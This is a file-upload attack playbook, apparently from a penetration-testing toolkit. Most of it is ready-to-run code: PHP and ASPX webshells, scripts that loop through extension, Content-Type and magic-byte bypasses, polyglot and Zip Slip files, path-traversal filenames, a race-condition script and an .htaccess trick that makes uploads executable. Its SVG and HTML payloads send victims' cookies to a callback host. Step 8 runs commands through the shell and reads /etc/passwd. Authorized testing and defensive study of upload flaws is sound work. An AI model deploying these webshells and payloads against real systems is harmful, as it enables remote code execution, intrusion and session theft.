# Playbook: File Upload Attack Guide

## Purpose
Test file upload functionality for RCE, stored XSS, path traversal,
and other attack vectors. Covers extension bypasses, magic byte manipulation,
and polyglot files.
Input: file upload endpoint or feature name.

---

## Step 1 — Recon the Upload Feature

```bash
# Identify allowed file types and restrictions
curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.txt" \
  -H "Cookie: session=YOUR_SESSION" | python3 -m json.tool

# Check response for:
# - File URL/path returned
# - Is the file accessible at a predictable URL?
# - Does the server rename files or keep original name?
# - What Content-Type does the server serve the uploaded file with?

UPLOAD_URL="https://TARGET/upload"
FILE_URL="https://TARGET/uploads/"  # where files are served from
```

---

## Step 2 — Extension Bypass Techniques

### PHP webshell
```bash
# Create test webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Direct upload (blocked if PHP is blacklisted)
curl -sk -X POST "$UPLOAD_URL" -F "file=@shell.php"

# Extension bypasses to try:
# PHP variants
EXTS=(".php" ".php3" ".php4" ".php5" ".php7" ".phtml" ".pht"
      ".pHp" ".PHP" ".PhP" ".Php"      # case
      ".php.jpg" ".php%00.jpg"          # null byte / double ext
      ".php " ".php."                   # trailing space/dot (Windows)
      ".php::$DATA"                     # Windows NTFS alternate data stream
      ".php%0a"                         # newline
      ".pHp5" ".pHP7"
)

for ext in "${EXTS[@]}"; do
  filename="shell${ext}"
  echo '<?php system($_GET["cmd"]); ?>' > "/tmp/$filename"
  response=$(curl -sk -X POST "$UPLOAD_URL" -F "file=@/tmp/$filename" \
    -H "Cookie: session=YOUR_SESSION")
  echo "[$ext] $response"
done

# ASPX webshell (for IIS targets)
cat > /tmp/shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% var cmd = Request["cmd"]; var p = new Process();
p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true;
p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>
EOF
curl -sk -X POST "$UPLOAD_URL" -F "file=@/tmp/shell.aspx"
```

---

## Step 3 — Content-Type Bypass

```bash
# Most servers validate Content-Type header, not just extension
# Override Content-Type to bypass filter

curl -sk -X POST "$UPLOAD_URL" \
  -H "Cookie: session=YOUR_SESSION" \
  -F "file=@shell.php;type=image/jpeg"  # claim it's a JPEG

curl -sk -X POST "$UPLOAD_URL" \
  -H "Cookie: session=YOUR_SESSION" \
  -F "file=@shell.php;type=image/png"

curl -sk -X POST "$UPLOAD_URL" \
  -H "Cookie: session=YOUR_SESSION" \
  -F "file=@shell.php;type=application/pdf"
```

---

## Step 4 — Magic Bytes Bypass

Some servers check file headers (magic bytes) instead of extension:

```bash
# Prepend JPEG magic bytes to PHP shell
python3 -c "
data = b'\xff\xd8\xff\xe0' + b'<?php system(\$_GET[\"cmd\"]); ?>'
with open('/tmp/shell_magic.php', 'wb') as f:
    f.write(data)
"
curl -sk -X POST "$UPLOAD_URL" -F "file=@/tmp/shell_magic.php"

# PNG header + PHP
python3 -c "
data = b'\x89PNG\r\n\x1a\n' + b'<?php system(\$_GET[\"cmd\"]); ?>'
with open('/tmp/shell_png.php', 'wb') as f:
    f.write(data)
"

# GIF89a bypass (classic)
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif.php
curl -sk -X POST "$UPLOAD_URL" -F "file=@/tmp/shell.gif.php"
```

---

## Step 5 — Polyglot Files

Files that are valid in two formats simultaneously:

```bash
# JPEG + PHP polyglot
# Inject PHP into EXIF data of a real JPEG
exiftool -Comment='<?php system($_GET["cmd"]); ?>' /tmp/real.jpg
cp /tmp/real.jpg /tmp/polyglot.php
curl -sk -X POST "$UPLOAD_URL" -F "file=@/tmp/polyglot.php"

# ZIP + PHP (Zip Slip)
mkdir /tmp/malzip
echo '<?php system($_GET["cmd"]); ?>' > /tmp/malzip/shell.php
# Create zip with path traversal
cd /tmp && python3 -c "
import zipfile
with zipfile.ZipFile('traversal.zip', 'w') as z:
    z.write('malzip/shell.php', '../../uploads/shell.php')
"
curl -sk -X POST "$UPLOAD_URL" -F "file=@/tmp/traversal.zip"

# SVG + XSS (for image upload that renders SVG)
cat > /tmp/xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://CALLBACK_URL/?c='+document.cookie</script>
</svg>
EOF
curl -sk -X POST "$UPLOAD_URL" -F "file=@/tmp/xss.svg;type=image/svg+xml"

# HTML upload → stored XSS
echo '<script>document.location="https://CALLBACK_URL/?c="+document.cookie</script>' \
  > /tmp/xss.html
curl -sk -X POST "$UPLOAD_URL" -F "file=@/tmp/xss.html"
```

---

## Step 6 — Path Traversal in Filename

```bash
# If server uses user-provided filename
TRAVERSAL_NAMES=(
  "../shell.php"
  "../../shell.php"
  "../../../var/www/html/shell.php"
  "..%2fshell.php"
  "..%252fshell.php"
  "....//shell.php"
  "%2e%2e%2fshell.php"
)

for name in "${TRAVERSAL_NAMES[@]}"; do
  curl -sk -X POST "$UPLOAD_URL" \
    -H "Cookie: session=YOUR_SESSION" \
    -F "file=@/tmp/shell.php;filename=$name"
done

# In multipart POST — modify filename in Burp:
# Content-Disposition: form-data; name="file"; filename="../shell.php"
```

---

## Step 7 — File Upload Race Condition

```bash
# Upload a file and immediately access it before server validates
# Run in parallel: upload + access
upload_and_access() {
  # Upload
  URL=$(curl -sk -X POST "$UPLOAD_URL" -F "file=@shell.php" \
    -H "Cookie: session=YOUR_SESSION" | grep -oP 'https?://[^\s"]+\.php')

  # Immediately try to execute
  for i in $(seq 50); do
    curl -sk "$URL?cmd=id" &
  done
}
upload_and_access
```

---

## Step 8 — Post-Upload Testing

Once a file is successfully uploaded:

```bash
UPLOADED_URL="https://TARGET/uploads/shell.php"

# Test if PHP executes
curl -sk "$UPLOADED_URL?cmd=id"
curl -sk "$UPLOADED_URL?cmd=whoami"
curl -sk "$UPLOADED_URL?cmd=cat+/etc/passwd"
curl -sk "$UPLOADED_URL?cmd=cat+/etc/hostname"

# If simple webshell doesn't execute but file is accessible:
# - Server may execute in a no-script directory
# - Try .htaccess upload to enable PHP execution:
echo "AddType application/x-httpd-php .jpg" > /tmp/.htaccess
curl -sk -X POST "$UPLOAD_URL" -F "file=@/tmp/.htaccess"

# Check if uploaded file is served with dangerous Content-Type
curl -sI "$UPLOADED_URL" | grep -i "content-type"
# text/html = XSS possible even without PHP execution
# image/jpeg = might be protected
```

---

## Step 9 — Impact Assessment by File Type Accepted

| File type accepted | Attack potential |
|---|---|
| `.php`, `.aspx`, `.jsp` | RCE — Critical |
| `.svg` | Stored XSS, SSRF |
| `.html`, `.htm` | Stored XSS |
| `.xml` | XXE |
| `.pdf` | Stored XSS via JavaScript in PDF |
| `.csv` | CSV injection (opens in Excel) |
| `.zip` | Zip Slip (path traversal) |
| `.docx`, `.xlsx` | XXE in Office XML |
| Any file, no execution | Stored XSS via Content-Type, social engineering |

---

## Output

```
ENDPOINT      : POST /api/profile/avatar
ALLOWED TYPES : image/jpeg, image/png (claimed)
BYPASS USED   : Content-Type: image/jpeg + .php extension
RESULT        : Shell uploaded → executed at /uploads/shell_abc123.php
                id → www-data
                hostname → prod-web-01
SEVERITY      : CRITICAL (RCE)
IMPACT        : Remote code execution as web server user
EVIDENCE      : [screenshot of id command output]
NEXT STEP     : Load 03_reporting/report_writer.md → report immediately
```
